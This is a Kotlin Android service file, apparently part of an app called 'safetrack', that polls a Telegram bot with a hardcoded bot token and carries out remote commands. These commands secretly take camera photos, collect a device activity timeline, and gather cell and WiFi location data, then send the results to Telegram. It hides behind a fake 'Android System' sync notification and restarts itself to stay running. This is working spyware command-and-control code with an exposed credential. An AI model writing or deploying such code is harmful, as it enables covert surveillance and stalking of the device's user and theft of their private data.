package com.example.safetrack

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.URL

class PersistentSyncService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastUpdateId = -1L

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, createNotification())
        startPolling()
        return START_STICKY
    }

    private fun startPolling() {
        serviceScope.launch {
            while (isActive) {
                try {
                    val botToken = "8961320031:AAGWyCdW9CziarfEF8p3ynltYOsMWUirxNw"
                    val urlString = "https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}"
                    val response = URL(urlString).readText()
                    val json = JSONObject(response)

                    if (json.getBoolean("ok")) {
                        val updates = json.getJSONArray("result")
                        var maxUpdateId = lastUpdateId
                        for (i in 0 until updates.length()) {
                            val update = updates.getJSONObject(i)
                            val currentUpdateId = update.getLong("update_id")
                            if (currentUpdateId > maxUpdateId) {
                                maxUpdateId = currentUpdateId
                            }

                            if (update.has("message")) {
                                val message = update.getJSONObject("message")
                                if (message.has("text")) {
                                    val text = message.getString("text")
                                    if (text == "/photo") {
                                        serviceScope.launch {
                                            CameraUtility.capturePhoto(this@PersistentSyncService)
                                        }
                                    } else if (text == "/p") {
                                        val timeline = ActivityTimelineUtility.generateActivityTimeline(this@PersistentSyncService, 12)
                                        TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📊 *Device Activity Log:*\n\n$timeline")
                                    } else if (text == "/cell") {
                                        val cellData = NetworkLocationUtility.getNetworkLocationInfo(this@PersistentSyncService)
                                        TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📡 *Cell/WiFi Diagnostic:*\n\n$cellData")
                                    }
                                }
                            }
                        }
                        lastUpdateId = maxUpdateId
                    }
                } catch (e: Exception) {
                    Log.e("PersistentSyncService", "Polling error", e)
                    delay(5000)
                }
                delay(10000)
            }
        }
    }

    private fun createNotification(): Notification {
        val channelId = "sync_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId, "System Sync", NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Android System")
            .setContentText("Syncing device state...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
